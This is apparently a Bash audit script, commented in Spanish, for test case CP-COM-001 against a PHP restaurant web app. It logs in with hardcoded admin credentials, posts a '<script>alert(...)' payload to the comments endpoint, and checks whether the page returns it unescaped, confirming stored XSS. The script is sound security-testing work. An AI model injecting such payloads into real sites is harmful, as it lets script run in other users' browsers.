#!/usr/bin/env bash
# CP-COM-001: XSS almacenado mediante el campo comentario
set -euo pipefail
DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$DIR/00_common.sh"
OUT="$DIR/../resultados/raw_CP-COM-001.txt"
JAR=/tmp/audit-mysql-run/cookies_com001.txt
rm -f "$JAR"

{
  echo "=== CP-COM-001: XSS almacenado ==="
  echo "--- Paso 1: login valido (admin@gmail.com/admin01) ---"
  curl -s -c "$JAR" -b "$JAR" -o /dev/null "$BASE_URL/index.php?id=1"
  curl -s -c "$JAR" -b "$JAR" -o /dev/null -X POST "$BASE_URL/setup/procesalogin.php" \
    --data-urlencode "frmusuario=admin@gmail.com" \
    --data-urlencode "frmpassword=admin01"
  echo "Login realizado."
  echo
  echo "--- Paso 2: POST grcomentarios.php con payload XSS ---"
  PAYLOAD='<script>alert("XSS-CP-COM-001")</script>'
  echo "usuario=Administrador&comentario=$PAYLOAD"
  curl -s -i -b "$JAR" -c "$JAR" -X POST "$BASE_URL/grcomentarios.php" \
    --data-urlencode "usuario=Administrador" \
    --data-urlencode "comentario=$PAYLOAD"
  echo
  echo "--- Paso 3: recuperar index.php?id=1 y verificar si el payload aparece SIN escapar ---"
  RESPONSE=$(curl -s -b "$JAR" "$BASE_URL/index.php?id=1")
  echo "$RESPONSE" | grep -o '<script>alert("XSS-CP-COM-001")</script>' || echo "(no se encontro el script sin escapar)"
  echo
  echo "--- Verificacion en BD (tabla comentarios) ---"
  mysql_cli -e "SELECT Id, usuario, comentario, id_restaurante FROM comentarios ORDER BY Id DESC LIMIT 3;"
  echo
  echo "--- Verificacion de ausencia de htmlspecialchars: se busca '&lt;script&gt;' (version escapada) ---"
  echo "$RESPONSE" | grep -o '&lt;script&gt;alert' && echo "ENCONTRADO ESCAPADO (no vulnerable)" || echo "NO se encontro version escapada -> el script se inserta LITERAL en el HTML, se ejecutaria en cualquier navegador con JS habilitado."
} | tee "$OUT"
